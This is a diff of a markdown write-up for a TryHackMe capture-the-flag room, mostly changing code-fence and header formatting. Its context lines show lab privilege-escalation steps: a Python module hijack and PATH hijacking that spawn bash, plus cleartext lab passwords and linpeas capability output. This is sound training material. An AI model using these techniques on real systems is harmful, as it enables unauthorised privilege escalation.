@@ -11,7 +11,7 @@ _**Nov 10, 2020**_
 
 ## Recon :
 
-```bash
+```
 bvr0n@kali:~/CTF/THM/Wonderland$ nmap -sC -sV 10.10.252.9
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-10 10:28 EST
 Nmap scan report for 10.10.252.9
@@ -32,7 +32,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Goin to the web page gets us only a `jpeg` image, let's download it and see what can we do with it :
 
-```bash
+```
 bvr0n@kali:~/CTF/THM/Wonderland$ wget http://10.10.252.9/img/white_rabbit_1.jpg
 bvr0n@kali:~/CTF/THM/Wonderland$ steghide extract -sf white_rabbit_1.jpg 
 Enter passphrase: 
@@ -69,22 +69,23 @@ alice:HowDothTheLittleCrocodileImproveHisShiningTail
 
 After some enumeration, i found out that the `/root/` is accessible by everyone but read permission was not given on the other hand execute permission was present, so we can get the `user.txt`
 
-#### Rabbit User :
+** Rabbit User :
 
 in Alice home directory we can find a script that basically import the random module.
 
 So, we can create a file named random.py in our current working directory that executes `/bin/bash` This way the python file should be loaded instead of the "real" random module, and in turn give us a shell as the rabbit user.
-
-```bash
-alice@wonderland:~$ cat random.py 
+`random.py` :
+```python 
 import os
 
 os.system("/bin/bash")
+```
+```
 alice@wonderland:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
 rabbit@wonderland:~$
 ```
 
-#### Hatter User :
+** Hatter User :
 
 In `/home/rabbit` we can see a setuid binary, after examining the file, we can see that `date` is getting executed without pecifying an absolute path :
 
@@ -98,7 +99,7 @@ Segmentation fault (core dumped)
 
 We can abuse this by exporting our own `$PATH` and providing a fake `date` script that will give us a shell with the user :
 
-```bash
+```
 rabbit@wonderland:/tmp$ cat date 
 #!/bin/bash
 /bin/bash
@@ -112,16 +113,16 @@ hatter
 ```
 Inside his directory we can find his ssh credentials :
 
-```bash
+```
 hatter@wonderland:/home/hatter$ cat password.txt 
 WhyIsARavenLikeAWritingDesk?
 ```
 
-#### Root :
+** Root :
 
 After some enumeration, linpeas showed something intresting :
 
-```bash
+```
 Files with capabilities:
 /usr/bin/perl5.26.1 = cap_setuid+ep
 /usr/bin/mtr-packet = cap_net_raw+ep
